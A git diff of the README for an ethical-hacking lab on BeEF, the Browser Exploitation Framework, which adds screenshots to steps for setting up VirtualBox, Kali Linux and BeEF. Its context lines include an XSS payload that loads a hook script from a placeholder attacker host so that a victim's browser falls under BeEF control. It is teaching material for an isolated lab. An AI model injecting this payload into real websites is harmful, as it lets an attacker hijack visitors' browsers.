@@ -1,4 +1,3 @@
-# BeEF-XSS
 BeEF (Browser Exploitation Framework) is a penetration testing tool focusing on web browsers. It "hooks" a target’s browser
 # BeEF-XSS – Ethical Hacking & Browser Exploitation Lab
 
@@ -26,6 +25,8 @@ VirtualBox is a free and open-source virtualization tool to run our VMs.
 2. Install and create virtual machines with proper specs.
 3. Configure **networking**: Use "Internal Network" for isolated attack scenarios.
 
+<img width="1603" height="1022" alt="Screenshot 2025-09-04 183406" src="https://github.com/user-attachments/assets/f11cd28a-cc7a-4c34-bebe-6b436619d42d" />
+
 ---
 
 ## Chapter 2: Installing Kali Linux
@@ -43,6 +44,8 @@ VirtualBox is a free and open-source virtualization tool to run our VMs.
 2. Import `.ova` file into VirtualBox.
 3. Set **network to Internal Network**.
 4. Boot up Kali Linux VM.
+
+<img width="1548" height="1016" alt="Screenshot 2025-09-04 184042" src="https://github.com/user-attachments/assets/b2a14f99-8acc-40ba-80e3-9002b5fa5851" />
 
 > Fix sources with:
 ```bash
@@ -77,6 +80,9 @@ BeEF (**Browser Exploitation Framework**) is a penetration testing tool that foc
 ```bash
 beef-xss
 ```
+
+<img width="1324" height="712" alt="Screenshot 2025-09-04 184325" src="https://github.com/user-attachments/assets/70847c50-60ff-4c99-a644-a10a563e2d42" />
+
 If not found, install it:
 ```bash
 sudo apt update && sudo apt install beef-xss -y
@@ -99,12 +105,16 @@ Default credentials:
 Username: beef  
 Password: beef
 ```
+
+<img width="1542" height="1020" alt="Screenshot 2025-09-04 184403" src="https://github.com/user-attachments/assets/08a7624b-6b1a-4dd1-96b0-90554293d4e1" />
+
 ## Hooking a Browser
 
 Inject this payload via an XSS vulnerability:
 ```bash
 <script src="http://<attacker-ip>:3000/hook.js"></script>
 ```
+
 
 Once executed, the victim’s browser connects to BeEF and appears in the control panel.
 
